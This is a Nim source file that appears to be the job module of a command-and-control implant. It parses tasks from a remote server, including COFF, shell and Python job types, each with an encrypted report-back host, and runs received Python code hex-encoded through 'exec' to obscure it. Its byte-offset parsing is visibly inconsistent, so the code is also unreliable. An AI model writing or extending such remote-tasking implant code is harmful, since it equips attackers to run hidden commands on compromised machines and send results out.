
import osproc, strutils, streams, times, strutils
import std/locks
import std/json
import encrypted_socket

type JobType = enum
    COFF = 0
    SHELL_CMD = 1
    SHELL_SCRIPT = 2
    PYTHON_SCRIPT = 3


type Job = object
    job_id: string
    job_type: JobType
    first_exec_time: int # timestamp of first execution
    exec_time: int # timestamp of current next execution
    repeat: bool # whether it should execute repeatedly or just once
    active: bool # whether the job has completely finished executing
    interval: int # number of seconds between each execution
    # whether and where (socket) to send output data from the process
    report_back: bool # whether it should report back
    report_back_socket: EncSocket
    data: seq[uint8] # the data (usually code) to execute

proc getId(self: Job):string = self.job_id
proc getType(self: Job):JobType = self.job_type
proc getFirstExecTime(self: Job):int = self.first_exec_time
proc getExecTime(self: Job):int = self.exec_time
proc isRepeating(self: Job):bool = self.repeat
proc isActive(self: Job):bool = self.active
proc getInterval(self: Job):int = self.interval
proc isReportingBack(self: Job):bool = self.report_back
proc getReportBackSocket(self: Job): EncSocket = self.report_back_socket
proc getReportBackHost(self: Job): string = self.report_back_socket.getHost()
proc getReportBackPort(self: Job): int = self.report_back_socket.getPort()
proc getData(self: Job):seq[uint8] = self.data

# serialized job data structure:
# [length (2 bytes)]            || [job type (1 byte)]          || [job id (36 bytes)]
# [first exec time (4 bytes)]   || [repeat (1 byte)]            || [interval exec time (2 bytes)]
# [report back bool (1 byte)]   || [report back port (2 bytes)] || [report back host (4 bytes)]
# [report back key (16 bytes)]
# [data remaining bytes]
# header is 69 bytes (nice)
proc deserialize_job(data: seq[uint8]): Job =
    let data_length: int = (data[0].int shl 8) or data[1].int
    let job_type: JobType = data[2].JobType
    let job_id: string = cast[string](data[3..39])
    var first_exec_time: int = 0
    for i in 0..<4:
        first_exec_time = (first_exec_time shl 8).int or data[39 + i].int
    let repeat: bool = (data[43] != 0)
    var interval: int = (data[44].int shl 8) or data[45].int
    let report_back: bool = (data[46] != 0)
    var report_back_port: int = (data[47].int shl 8) or data[48].int
    var report_back_host: string = ""
    for i in 0..<4:
        report_back_host.add($(data[49+i]))
        if i == 3:
            break
        report_back_host.add('.')
    var key: array[2, uint64]
    for i in 0..<16:
        key[i shr 3] = (key[i shr 3] shl 8) or data[53 + i]
    var report_back_socket: EncSocket = newEncSocket(report_back_host, report_back_port, key)
    var job_data: seq[uint8] = data[70..(69+data_length)]
    var job: Job = Job(
        job_id: job_id, job_type: job_type,
        first_exec_time: first_exec_time, exec_time: first_exec_time, repeat: repeat, interval: interval,
        report_back: report_back, report_back_socket: report_back_socket,
        data: job_data
    )
    return job

proc json2job(json_string: string): Job =
    let json_data = parseJson(json_string)
    # json was a mistake
    let
        key_a: int = json_data["report_back_key"][0].getInt()
        key_b: int = json_data["report_back_key"][1].getInt()
        key_c: int = json_data["report_back_key"][2].getInt()
        key_d: int = json_data["report_back_key"][3].getInt()
    let rb_key: array[2, uint64] = [
        (key_a.uint64 shl 32) or key_b.uint64,
        (key_c.uint64 shl 32) or key_d.uint64
        ]
    var report_back_socket: EncSocket = newEncSocket(json_data["report_back_host"].getStr(), json_data["report_back_port"].getInt(), rb_key)
    var data: seq[uint8]
    for d in json_data["data"].getStr():
        data.add(d.uint8)
    var job: Job = Job(
        job_id: json_data["job_id"].getStr(),
        job_type: json_data["job_type"].getInt().JobType,
        first_exec_time: json_data["first_exec_time"].getInt(),
        exec_time: json_data["exec_time"].getInt(),
        repeat: json_data["repeat"].getInt().bool,
        interval: json_data["interval"].getInt(),
        report_back: json_data["report_back"].getInt().bool,
        report_back_socket: report_back_socket,
        data: data
    )
    return job

proc serialize_job(self: var Job): seq[uint8] =
    echo "Not implemented :(("

# this sucks, i can do better, but i'm doing the jonathan blow and taking it slow :))
proc execute(self: var Job) =
    if not self.repeat:
        self.active = false
    if self.job_type == JobType.PYTHON_SCRIPT:
        var hex_string: string = ""
        for c in self.data:
            hex_string.add(toHex(c, 2))
        discard execProcess("python3", args=["-c","exec(bytes.fromhex('" & hex_string & "').decode())"])

proc check_schedule(self: var Job) =
    let EPOCH = getTime().toUnix().int
    if not self.active:
        return
    if self.exec_time <= EPOCH:
        self.exec_time += self.interval
        self.execute()

export Job, JobType, deserialize_job, getId, getType, getFirstExecTime, getExecTime, isRepeating, isActive, getInterval, isReportingBack, getReportBackSocket, getReportBackHost, getReportBackPort, getData, json2job